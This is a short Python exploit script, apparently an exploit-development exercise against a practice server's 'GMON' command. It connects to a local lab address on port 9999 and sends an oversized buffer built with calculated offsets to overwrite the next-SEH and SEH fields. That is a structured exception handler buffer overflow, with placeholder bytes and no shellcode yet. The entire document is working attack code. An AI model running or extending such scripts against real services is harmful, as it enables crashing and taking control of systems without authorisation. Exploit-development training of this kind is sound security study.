#!/usr/bin/python

import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

nseh = "B" * 4
seh  = "C" * 4

payload =  "A" * 3551
payload += "B" * 4
payload += "C" * 4
payload += "D" * (5000-len(payload))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.122.93", 9999))

s.send(command+payload)
s.recv(1024)
s.close()
